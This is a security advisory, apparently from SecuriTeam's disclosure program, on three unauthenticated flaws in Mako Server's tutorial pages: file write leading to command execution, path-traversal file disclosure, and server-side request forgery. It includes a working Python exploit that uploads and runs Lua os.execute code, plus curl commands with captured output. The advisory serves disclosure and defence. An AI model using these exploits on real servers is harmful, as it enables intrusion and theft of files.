@@ -1,0 +1,161 @@
+[+] SSD Beyond Security: https://blogs.securiteam.com/index.php/archives/3391
+[+] Credits: John Page a.k.a hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MAKO-WEB-SERVER-MULTIPLE-UNAUTHENTICATED-VULNERABILIITIES-SECURITEAM.txt
+[+] ISR: ApparitionSec            
+
+
+Vulnerabilities Summary
+The following advisory describe three (3) vulnerabilities found in Mako Server’s tutorial page.
+
+The vulnerabilities found are:
+
+Unauthenticated Arbitrary File Write vulnerability that leads to Remote Command Execution
+Unauthenticated File Disclosure
+Unauthenticated Server Side Request Forgery
+As these tutorial may be used as the basis for production code, it is important for users to be aware of these issues.
+
+“As a compact application and web server, the Mako Server helps developers rapidly design secure IoT and web applications. The Mako Server provides
+an application server environment from which developers can design and implement complete, custom solutions. The Mako Web Server is ideal for embedded Linux systems.”
+
+Credit
+An independent security researcher, John Page AKA hyp3rlinx, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
+
+Vendor response
+
+RealTimeLogic was informed of the vulnerability on Aug 13, but while acknowledging the receipt of the vulnerability information, refused to respond to the
+technical claims, to give a fix timeline or coordinate an advisory, saying:
+
+“I just sent a formal notification for the commercial license requirement and also we need to put a maintenance contract in place.
+Internally I need to set-up a cost allocation account for billing against these support inquiries.”
+
+At this time it’s unclear whether these vulnerabilities are going to be fixed and further attempts to get a status clarification failed.
+
+
+Vulnerabilities details
+
+Unauthenticated Arbitrary File Write vulnerability that leads to Remote Command Execution:
+
+Mako web-server tutorial does not sufficiently sanitizing the HTTP PUT requests, when an attacker send HTTP PUT request to ‘save.lsp‘ web page, the input passed
+to a function responsible for accessing the filesystem.
+
+The attacker input will be saved on the victims machine and can be execute by sending HTTP GET request to ‘manage.lsp‘
+
+
+HTTP PUT  'http://VICTIM-IP/examples/save.lsp?ex=2.1'
+HTTP GET  'http://VICTIM-IP/examples/manage.lsp?execute=true&ex=2.1&type=lua'
+
+
+Proof of Concept
+
+
+import urllib2,time
+
+#MakoServer v2.5 Remote Command Execution 0day
+#Credits: John Page AKA hyp3rlinx
+#=========================================
+
+print  'MakoServer v2.5 Remote Command Execution'
+
+CMD="os.execute('c:/Windows/system32/calc.exe')"
+
+opener = urllib2.build_opener(urllib2.HTTPHandler)
+request = urllib2.Request('http://IP/examples/save.lsp?ex=2.1', data=CMD)
+request.add_header('Content-Type', 'text/plain;charset=UTF-8')
+request.add_header('X-Requested-With', 'XMLHttpRequest')
+request.add_header('Referer', 'http://localhost/Lua-Types.lsp')
+request.get_method = lambda: 'PUT'
+opener.open(request)
+
+time.sleep(1)
+
+urllib2.urlopen('http://IP/examples/manage.lsp?execute=true&ex=2.1&type=lua')
+
+
+
+Unauthenticated File Disclosure
+
+Mako web-server tutorial is not sufficiently sanitizing GET requests, when an attacker send GET request to the URI IP/fs/../.., the input passed
+without modification and the response with the file content is returned.
+
+Proof of Concept
+The following GET request will response with the C/Windows/system.ini content:
+
+curl -v http://VICTIM-IP/fs/C/Windows/system.ini
+
+* About to connect() to VICTIM-IP port 80
+*   Trying VICTIM-IP... connected
+* Connected to VICTIM-IP (VICTIM-IP) port 80
+> GET /fs/C/Windows/system.ini HTTP/1.1
+> User-Agent: curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5
+> Host: VICTIM-IP
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Mon, 07 Aug 2017 22:21:27 GMT
+< Server: MakoServer.net
+< Content-Type: application/octet-stream
+< Accept-Ranges: bytes
+< Etag: 58b4be20
+< Last-Modified: Tue, 28 Feb 2017 00:02:40 GMT
+< Content-Length: 219
+< Keep-Alive: Keep-Alive
+; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+
+
+Server Side Request Forgery
+
+Mako web-server tutorial is not sufficiently sanitizing incoming POST requests, when an attacker sends an POST request to the ‘rtl/appmgr/new-application.lsp‘
+URI, the input will be executed and the server will connect to the attacker’s machine.
+
+Proof of Concept
+Start Wireshark to see successful connections made from Mako Web Server victim machine.
+
+Initiate requests from another machine using CURL:
+
+curl -v -X POST http://VICTIM-IP/rtl/appmgr/new-application.lsp -d io=net -d path=http://EXTERNAL-IP
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+====================
+Would like to acknowledge Beyond Security’s SSD program for the help with co-ordination of this vulnerability.
+More details can be found on their blog at:
+
+https://blogs.securiteam.com/index.php/archives/3391
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
